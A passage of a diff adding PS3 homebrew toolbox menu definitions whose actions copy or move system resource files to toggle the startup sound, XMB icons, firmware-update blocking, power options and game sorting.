+				<Pair key="module_action"><>fcopy#/dev_hdd0/boot_plugins.txt#/dev_hdd0/boot_plugins.txt.bak#/dev_hdd0/boot_plugins_nocobra.txt#/dev_hdd0/boot_plugins_nocobra.txt.bak#/dev_hdd0/boot_plugins_nocobra_dex.txt#/dev_hdd0/boot_plugins_nocobra_dex.txt.bak#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_bootplugins1" attr="disable_bootplugins1"/>
+		</Items>
+	</View>
+
+	<View id="toggle_mute_coldboot_items">
+		<Attributes>
+			<Table key="mute_coldboot_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable Start Up Sound</></Pair>
+				<Pair key="info"><>Remove coldboot_stereo.ac3 and coldboot_multi.ac3</></Pair>
+			</Table>
+			<Table key="mute_coldboot_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable Start Up Sound</></Pair>
+				<Pair key="info"><>Replace coldboot_stereo.ac3 and coldboot_multi.ac3</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="mute_coldboot_disable" attr="mute_coldboot_disable" src="#disable_mute_coldboot"/>
+			<Query class="type:x-xmb/folder-pixmap" key="mute_coldboot_enable" attr="mute_coldboot_enable" src="#enable_mute_coldboot"/>
+		</Items>
+	</View>
+
+	<View id="disable_mute_coldboot">
+		<Attributes>
+			<Table key="disable_mute_coldboot_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable Start Up Sound?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This moves the dev_blind/vsh/resource/coldboot_*.ac3 files to a backup location</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/vsh/resource/coldboot_stereo.ac3#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/coldboot_sound/coldboot_stereo.ac3#/dev_blind/vsh/resource/coldboot_multi.ac3#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/coldboot_sound/coldboot_multi.ac3#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_mute_coldboot_item" attr="disable_mute_coldboot_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_mute_coldboot">
+		<Attributes>
+			<Table key="enable_mute_coldboot_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable Start Up Sound?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This puts the dev_blind/vsh/resource/coldboot_*.ac3 files back in the standard location</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/coldboot_sound/coldboot_stereo.ac3#/dev_blind/vsh/resource/coldboot_stereo.ac3#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/coldboot_sound/coldboot_multi.ac3#/dev_blind/vsh/resource/coldboot_multi.ac3#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_mute_coldboot_item" attr="enable_mute_coldboot_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_xil_items">
+		<Attributes>
+			<Table key="toggle_xil_game">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_singstar.png</></Pair>
+				<Pair key="title"><>Toggle Singstar</></Pair>
+				<Pair key="info"><>Enable/Disable all xil items in the game category</></Pair>
+			</Table>
+			<Table key="toggle_xil_tv">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_tv.png</></Pair>
+				<Pair key="title"><>Toggle Amazon Video/Netflix</></Pair>
+				<Pair key="info"><>Enable/Disable all xil items in the TV category</></Pair>
+			</Table>
+			<Table key="toggle_xil_music">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_spotify.png</></Pair>
+				<Pair key="title"><>Toggle Spotify</></Pair>
+				<Pair key="info"><>Enable/Disable all xil items in the music category</></Pair>
+			</Table>
+			<Table key="toggle_photo_gallery">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_hknw.png</></Pair>
+				<Pair key="title"><>Toggle Photo Gallery</></Pair>
+				<Pair key="info"><>Enable/Disable Photo Gallery in the photo category</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_xil_game" attr="toggle_xil_game" src="#toggle_xil_game_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_xil_tv" attr="toggle_xil_tv" src="#toggle_xil_tv_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_xil_music" attr="toggle_xil_music" src="#toggle_xil_music_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_photo_gallery" attr="toggle_photo_gallery" src="#toggle_photo_gallery_items"/>
+		</Items>
+	</View>
+
+	<View id="toggle_xil_music_items">
+	<Attributes>
+			<Table key="xil_music_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable Spotify</></Pair>
+				<Pair key="info"><>Stop the Spotify icon from showing in the music category</></Pair>
+			</Table>
+			<Table key="xil_music_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable Spotify</></Pair>
+				<Pair key="info"><>Allow the Spotify icon to appear in music category</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="xil_music_disable" attr="xil_music_disable" src="#disable_xil_music"/>
+			<Query class="type:x-xmb/folder-pixmap" key="xil_music_enable" attr="xil_music_enable" src="#enable_xil_music"/>
+		</Items>
+	</View>
+
+	<View id="disable_xil_music">
+		<Attributes>
+			<Table key="disable_xil_music_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Disable Spotify?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/tmp/explore/xil2/music#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/on/music#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/off/music#/dev_hdd0/tmp/explore/xil2/music#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_xil_music_item" attr="disable_xil_music_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_xil_music">
+		<Attributes>
+			<Table key="enable_xil_music_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Spotify?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/tmp/explore/xil2/music#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/off/music#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/on/music#/dev_hdd0/tmp/explore/xil2/music#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_xil_music_item" attr="enable_xil_music_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_xil_game_items">
+	<Attributes>
+			<Table key="xil_game_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable Singstar</></Pair>
+				<Pair key="info"><>Stop the Singstar icon from showing in the game category</></Pair>
+			</Table>
+			<Table key="xil_game_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable Singstar</></Pair>
+				<Pair key="info"><>Allow the Singstar icon to appear in the game category</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="xil_game_disable" attr="xil_game_disable" src="#disable_xil_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="xil_game_enable" attr="xil_game_enable" src="#enable_xil_game"/>
+		</Items>
+	</View>
+
+	<View id="disable_xil_game">
+		<Attributes>
+			<Table key="disable_xil_game_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Disable Singstar?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/tmp/explore/xil2/game#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/on/game#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/off/game#/dev_hdd0/tmp/explore/xil2/game#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_xil_game_item" attr="disable_xil_game_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_xil_game">
+		<Attributes>
+			<Table key="enable_xil_game_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Singstar?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/tmp/explore/xil2/game#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/off/game#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/on/game#/dev_hdd0/tmp/explore/xil2/game#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_xil_game_item" attr="enable_xil_game_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_xil_tv_items">
+	<Attributes>
+			<Table key="xil_tv_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable Amazon Video/Netflix</></Pair>
+				<Pair key="info"><>Stop the Amazon Video icon from showing in the tv category</></Pair>
+			</Table>
+			<Table key="xil_tv_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable Amazon Video/Netflix</></Pair>
+				<Pair key="info"><>Allow the Amazon Video icon to appear in the tv category</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="xil_tv_disable" attr="xil_tv_disable" src="#disable_xil_tv"/>
+			<Query class="type:x-xmb/folder-pixmap" key="xil_tv_enable" attr="xil_tv_enable" src="#enable_xil_tv"/>
+		</Items>
+	</View>
+
+	<View id="disable_xil_tv">
+		<Attributes>
+			<Table key="disable_xil_tv_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Disable Amazon Video/Netflix?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/tmp/explore/xil2/tv#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/on/tv#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/off/tv#/dev_hdd0/tmp/explore/xil2/tv#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_xil_tv_item" attr="disable_xil_tv_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_xil_tv">
+		<Attributes>
+			<Table key="enable_xil_tv_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Amazon Video/Netflix?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/tmp/explore/xil2/tv#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/off/tv#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/xil/on/tv#/dev_hdd0/tmp/explore/xil2/tv#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_xil_tv_item" attr="enable_xil_tv_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_updates_items">
+	<Attributes>
+			<Table key="disable_online_updates">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Block Online Updates Only</></Pair>
+				<Pair key="info"><>Stops the console from downloading online updates</></Pair>
+			</Table>
+			<Table key="disable_all_xmb_updates">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Block All XMB Update Methods</></Pair>
+				<Pair key="info"><>Blocks the system update icon. Recovery menu untouched</></Pair>
+			</Table>
+			<Table key="enable_all_xmb_updates">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable All Update Methods</></Pair>
+				<Pair key="info"><>Resets system update functionality to normal</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="disable_online_updates" attr="disable_online_updates" src="#disable_online_updates_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="disable_all_xmb_updates" attr="disable_all_xmb_updates" src="#disable_all_xmb_updates_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_all_xmb_updates" attr="enable_all_xmb_updates" src="#enable_all_xmb_updates_item"/>
+		</Items>
+	</View>
+
+	<View id="disable_online_updates_item">
+		<Attributes>
+			<Table key="disable_online_update">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable Online Updates?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies a modified software_update_plugin.rco to dev_blind/vsh/resource/
+				</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/firmware_updates/software_update_plugin_online_disabled.rco#/dev_blind/vsh/resource/software_update_plugin.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_online_update" attr="disable_online_update"/>
+		</Items>
+	</View>
+
+	<View id="disable_all_xmb_updates_item">
+		<Attributes>
+			<Table key="disable_all_xmb_update">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable All XMB Update Methods?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies a modified software_update_plugin.rco to dev_blind/vsh/resource/
+				Recovery mode is untouched so you can still update from there if you need to</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/firmware_updates/software_update_plugin_all_disabled.rco#/dev_blind/vsh/resource/software_update_plugin.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_all_xmb_update" attr="disable_all_xmb_update"/>
+		</Items>
+	</View>
+
+	<View id="enable_all_xmb_updates_item">
+		<Attributes>
+			<Table key="enable_all_xmb_update">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable All Update Methods?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies the standard software_update_plugin.rco to dev_blind/vsh/resource/</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/firmware_updates/software_update_plugin_original.rco#/dev_blind/vsh/resource/software_update_plugin.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_all_xmb_update" attr="enable_all_xmb_update"/>
+		</Items>
+	</View>
+
+	<View id="toggle_photo_gallery_items">
+	<Attributes>
+			<Table key="toggle_photo_gallery_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable Photo Gallery</></Pair>
+				<Pair key="info"><>Allow the Photo Gallery icon to appear in the photo category</></Pair>
+			</Table>
+			<Table key="toggle_photo_gallery_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable Photo Gallery</></Pair>
+				<Pair key="info"><>Remove the Photo Gallery icon from the photo category</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_photo_gallery_enable" attr="toggle_photo_gallery_enable" src="#toggle_photo_gallery_enable_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_photo_gallery_disable" attr="toggle_photo_gallery_disable" src="#toggle_photo_gallery_disable_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_photo_gallery_enable_item">
+		<Attributes>
+			<Table key="photo_gallery_enable_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable Photo Gallery?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies the official category_photo.xml to dev_blind/vsh/resource/explore/xmb/</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/photo_gallery/on#/dev_blind/vsh/resource/explore/xmb#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/photo_gallery_enabled#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/photo_gallery_actual</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="photo_gallery_enable_item" attr="photo_gallery_enable_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_photo_gallery_disable_item">
+		<Attributes>
+			<Table key="photo_gallery_disable_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable Photo Gallery?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies a modified category_photo.xml to dev_blind/vsh/resource/explore/xmb/</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/photo_gallery/off#/dev_blind/vsh/resource/explore/xmb#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/photo_gallery_disabled#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/photo_gallery_actual</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="photo_gallery_disable_item" attr="photo_gallery_disable_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_power_options_items">
+	<Attributes>
+			<Table key="toggle_power_options_reboot">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Soft Reboot</></Pair>
+				<Pair key="info"><>Enable a soft reboot icon above Turn off system in the user category</></Pair>
+			</Table>
+			<Table key="toggle_power_options_full">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Power Options</></Pair>
+				<Pair key="info"><>Enable standard power options subsection in the user category</></Pair>
+			</Table>
+			<Table key="toggle_power_options_ultimate">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Ultimate Power Options</></Pair>
+				<Pair key="info"><>Enable advanced power cycling subsection in the user category</></Pair>
+			</Table>
+			<Table key="toggle_power_options_and_poweroff">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Ultimate Reboot Options</></Pair>
+				<Pair key="info"><>Enable Reboot Options subsection in the user category</></Pair>
+			</Table>
+			<Table key="toggle_power_options_original">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Revert To Official Power Off</></Pair>
+				<Pair key="info"><>Remove all extra power options from the user category</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_power_options_reboot" attr="toggle_power_options_reboot" src="#toggle_power_options_reboot_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_power_options_full" attr="toggle_power_options_full" src="#toggle_power_options_full_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_power_options_ultimate" attr="toggle_power_options_ultimate" src="#toggle_power_options_ultimate_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_power_options_and_poweroff" attr="toggle_power_options_and_poweroff" src="#toggle_power_options_and_poweroff_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_power_options_original" attr="toggle_power_options_original" src="#toggle_power_options_original_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_power_options_reboot_item">
+		<Attributes>
+			<Table key="power_options_reboot_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Soft Reboot?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back (XMB Refresh Required)</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/power_options/reboot#/dev_blind/vsh/resource/explore#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_reboot#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_actual</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="power_options_reboot_item" attr="power_options_reboot_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_power_options_full_item">
+		<Attributes>
+			<Table key="power_options_full_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Power Options?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back (XMB Refresh Required)</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/power_options/full#/dev_blind/vsh/resource/explore#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_full#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_actual</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="power_options_full_item" attr="power_options_full_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_power_options_and_poweroff_item">
+		<Attributes>
+			<Table key="power_options_full_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Reboot Options + Power Off?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back (XMB Refresh Required)</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/power_options/extra#/dev_blind/vsh/resource/explore#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_extra#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_actual</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="power_options_full_item" attr="power_options_full_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_power_options_ultimate_item">
+		<Attributes>
+			<Table key="power_options_ultimate_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Ultimate Power Options?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back (XMB Refresh Required)</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/power_options/ultimate#/dev_blind/vsh/resource/explore#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_ultimate#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_actual</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="power_options_ultimate_item" attr="power_options_ultimate_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_power_options_original_item">
+		<Attributes>
+			<Table key="power_options_original_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Revert to Offical Power Off?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back (XMB Refresh Required)</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/power_options/original#/dev_blind/vsh/resource/explore#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_original#/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/power_options_actual</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="power_options_original_item" attr="power_options_original_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sorting_items">
+	<Attributes>
+			<Table key="toggle_game_sort_name">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name</></Pair>
+				<Pair key="info"><>Change game sorting to have options for A-Z and Z-A</></Pair>
+			</Table>
+			<Table key="toggle_game_sort_name_date">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name or Date</></Pair>
+				<Pair key="info"><>Change game sorting to have options for A-Z and New-Old</></Pair>
+			</Table>
+			<Table key="toggle_game_sort_date">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Revert to Standard Game Sorting Options</></Pair>
+				<Pair key="info"><>Change game sorting to official with just New-Old and Old-New</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
